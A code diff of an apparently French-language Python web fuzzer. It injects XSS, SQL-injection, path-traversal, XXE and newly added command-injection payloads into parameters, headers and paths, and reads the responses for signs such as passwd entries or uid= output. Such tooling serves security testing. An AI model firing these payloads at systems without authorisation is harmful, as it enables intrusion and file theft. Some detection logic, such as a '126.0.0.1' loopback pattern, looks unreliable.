@@ -1,5 +1,4 @@
-"""
-Fuzzer paramétrique — injection automatisée de payloads dans tous les points d'entrée.
+"""Fuzzer paramétrique — injection automatisée de payloads dans tous les points d'entrée.
 
 Modes :
 - Paramètres GET/POST
@@ -12,7 +11,7 @@ import asyncio
 import time
 from dataclasses import dataclass, field
 from typing import Any
-from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
+from urllib.parse import parse_qs, urlencode, urlparse, urlunparse
 
 import httpx
 
@@ -27,7 +26,7 @@ logger = get_logger(__name__)
 FUZZ_PAYLOADS: dict[str, list[str]] = {
     "xss": [
         "<script>alert(1)</script>",
-        "\"><script>alert(1)</script>",
+        '"><script>alert(1)</script>',
         "<img src=x onerror=alert(1)>",
         "';alert(1);//",
         "<svg/onload=alert(1)>",
@@ -35,7 +34,7 @@ FUZZ_PAYLOADS: dict[str, list[str]] = {
     "sqli": [
         "'",
         "' OR 1=1--",
-        "\" OR 1=1--",
+        '" OR 1=1--',
         "1' AND 1=1--",
         "1' ORDER BY 10--",
         "1 UNION SELECT 1,2,3--",
@@ -48,12 +47,36 @@ FUZZ_PAYLOADS: dict[str, list[str]] = {
         "....//....//....//etc/passwd",
     ],
     "command_injection": [
+        # Séparateurs de base
         "; ls -la",
         "| whoami",
         "`id`",
         "$(cat /etc/passwd)",
         "&& dir C:\\",
         "| dir C:\\",
+        # Séparateurs additionnels
+        "; id",
+        "| id",
+        "& whoami",
+        "|| whoami",
+        "`ls`",
+        "&& whoami",
+        # Commandes Unix supplémentaires
+        "| cat /etc/hosts",
+        "; cat /etc/hosts",
+        "`cat /etc/passwd`",
+        "$(id)",
+        "& ping -c 1 127.0.0.1 &",
+        # Commandes Windows
+        "| type C:\\Windows\\System32\\drivers\\etc\\hosts",
+        "; type C:\\Windows\\System32\\drivers\\etc\\hosts",
+        # Encodage URL (simple)
+        "%3B%20id",
+        "%7C%20id",
+        "%3Bcat%20/etc/passwd",
+        # Double encodage URL
+        "%253B%2520id",
+        "%257C%2520id",
     ],
     "xxe": [
         '<?xml version="1.0"?><!DOCTYPE a [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><a>&xxe;</a>',
@@ -95,6 +118,7 @@ FUZZ_PAYLOADS: dict[str, list[str]] = {
 @dataclass
 class FuzzResult:
     """Résultat d'un test de fuzzing."""
+
     url: str
     injection_point: str  # parameter | header | path
     parameter_name: str
@@ -111,6 +135,7 @@ class FuzzResult:
 @dataclass
 class FuzzReport:
     """Rapport complet de fuzzing."""
+
     url: str
     total_tests: int
     anomalies: list[FuzzResult] = field(default_factory=list)
@@ -126,8 +151,7 @@ class FuzzReport:
 
 
 class Fuzzer:
-    """
-    Fuzzer HTTP paramétrique.
+    """Fuzzer HTTP paramétrique.
     Injecte des payloads dans tous les points d'entrée et détecte les anomalies.
     """
 
@@ -165,14 +189,14 @@ class Fuzzer:
         headers: dict[str, str] | None = None,
         body: str | None = None,
     ) -> FuzzReport:
-        """
-        Fuzze une URL complète.
+        """Fuzze une URL complète.
 
         Args:
             url: URL à fuzzer
             method: GET, POST, PUT, etc.
             headers: En-têtes à inclure
             body: Corps pour POST/PUT
+
         """
         t0 = time.monotonic()
         client = await self._get_client()
@@ -195,28 +219,50 @@ class Fuzzer:
         for param_name in params:
             for category in self.categories:
                 for payload in FUZZ_PAYLOADS.get(category, []):
-                    tasks.append(self._fuzz_param(
-                        client, url, method, param_name, payload,
-                        category, baseline, "parameter",
-                    ))
+                    tasks.append(
+                        self._fuzz_param(
+                            client,
+                            url,
+                            method,
+                            param_name,
+                            payload,
+                            category,
+                            baseline,
+                            "parameter",
+                        ),
+                    )
         report.total_tests += len(tasks)
 
         # 4. Fuzzer les en-têtes
         for header_name in header_names:
             for category in self.categories:
                 for payload in FUZZ_PAYLOADS.get(category, [])[:3]:  # Limiter les headers
-                    tasks.append(self._fuzz_header(
-                        client, url, method, header_name, payload,
-                        category, baseline, headers,
-                    ))
+                    tasks.append(
+                        self._fuzz_header(
+                            client,
+                            url,
+                            method,
+                            header_name,
+                            payload,
+                            category,
+                            baseline,
+                            headers,
+                        ),
+                    )
         report.total_tests += len(tasks)
 
         # 5. Fuzzer les segments de chemin
         for _i, _segment in enumerate(path_segments[:5]):  # Max 5 segments
             for payload in FUZZ_PAYLOADS.get("path_traversal", [])[:3]:
-                tasks.append(self._fuzz_path(
-                    client, parsed, _i, payload, baseline,
-                ))
+                tasks.append(
+                    self._fuzz_path(
+                        client,
+                        parsed,
+                        _i,
+                        payload,
+                        baseline,
+                    ),
+                )
         report.total_tests += len(tasks)
 
         # 6. Exécuter tous les tests
@@ -285,8 +331,14 @@ class Fuzzer:
             test_url = urlunparse(new_parsed)
 
             return await self._do_fuzz_request(
-                client, test_url, method, baseline, param, payload,
-                category, injection_type,
+                client,
+                test_url,
+                method,
+                baseline,
+                param,
+                payload,
+                category,
+                injection_type,
             )
 
     async def _fuzz_header(
@@ -306,8 +358,15 @@ class Fuzzer:
             headers[header_name] = payload
 
             return await self._do_fuzz_request(
-                client, url, method, baseline, header_name, payload,
-                category, "header", extra_headers=headers,
+                client,
+                url,
+                method,
+                baseline,
+                header_name,
+                payload,
+                category,
+                "header",
+                extra_headers=headers,
             )
 
     async def _fuzz_path(
@@ -332,8 +391,14 @@ class Fuzzer:
             test_url = urlunparse(new_parsed)
 
             return await self._do_fuzz_request(
-                client, test_url, "GET", baseline, original, payload,
-                "path_traversal", "path",
+                client,
+                test_url,
+                "GET",
+                baseline,
+                original,
+                payload,
+                "path_traversal",
+                "path",
             )
 
     async def _do_fuzz_request(
@@ -407,7 +472,6 @@ class Fuzzer:
             anomalies = [anomaly, evidence]
 
         # 2. Augmentation drastique du temps de réponse
-        basetime = 0.1  # estimation baseline
         if result.response_time_diff_ms > 2000:
             anomalies.append(f"Temps de réponse anormal : {result.response_time_diff_ms:.0f}ms")
             anomalies.append(resp.text[:200])
@@ -415,27 +479,59 @@ class Fuzzer:
         # 3. Changement significatif de la taille de réponse
         if abs(result.response_length_diff) > 5000:
             anomalies.append(
-                f"Taille de réponse anormale (diff: {result.response_length_diff:+d} octets)"
+                f"Taille de réponse anormale (diff: {result.response_length_diff:+d} octets)",
             )
 
         # 4. Réflexion du payload (potentiel XSS)
         if result.payload in resp.text and result.payload_category == "xss":
             anomalies = [
-                f"Payload XSS reflété dans la réponse",
+                "Payload XSS reflété dans la réponse",
                 f"Payload: {result.payload[:50]}",
             ]
 
         # 5. Erreur SQL dans la réponse
         sql_patterns = [
-            r"SQL syntax", r"mysql_fetch", r"ORA-[0-9]",
-            r"unclosed quotation", r"ODBC Driver",
+            r"SQL syntax",
+            r"mysql_fetch",
+            r"ORA-[0-9]",
+            r"unclosed quotation",
+            r"ODBC Driver",
         ]
         import re
+
         for pat in sql_patterns:
             if re.search(pat, resp.text, re.IGNORECASE):
                 anomalies = [
-                    f"Erreur SQL détectée dans la réponse",
+                    "Erreur SQL détectée dans la réponse",
                     f"Pattern: {pat}",
+                ]
+
+        # 6. Preuve d'exécution de commande dans la réponse (command_injection)
+        if result.payload_category == "command_injection":
+            cmd_exec_patterns = [
+                r"uid=\d+",  # Unix id (uid=1000)
+                r"root:.*?:0:0:",  # /etc/passwd root entry
+                r"bin:.*?:1:1:",  # /etc/passwd bin entry
+                r"Volume Serial Number",  # Windows DIR
+                r"Directory of ",  # Windows DIR
+                r"r[-wxsStT-]{8}\s+\d+",  # Permissions Unix (rwxr-xr-x)
+                r"total \d+",  # ls -la header
+                r"\d+ \w{3,9} \d+ \d{2}:\d{2}",  # Date style ls -la
+                r"126\.0\.0\.1",  # Loopback erroné (signe injection)
+            ]
+            for pat in cmd_exec_patterns:
+                if re.search(pat, resp.text):
+                    anomalies = [
+                        "Exécution de commande détectée dans la réponse",
+                        f"Pattern: {pat}",
+                    ]
+                    break
+
+            # 7. Variation de taille de réponse pour command_injection (> 100 octets)
+            if not anomalies and abs(result.response_length_diff) > 100:
+                anomalies = [
+                    f"Variation de taille suspecte pour command_injection (diff: {result.response_length_diff:+d} octets)",
+                    "",
                 ]
 
         return anomalies
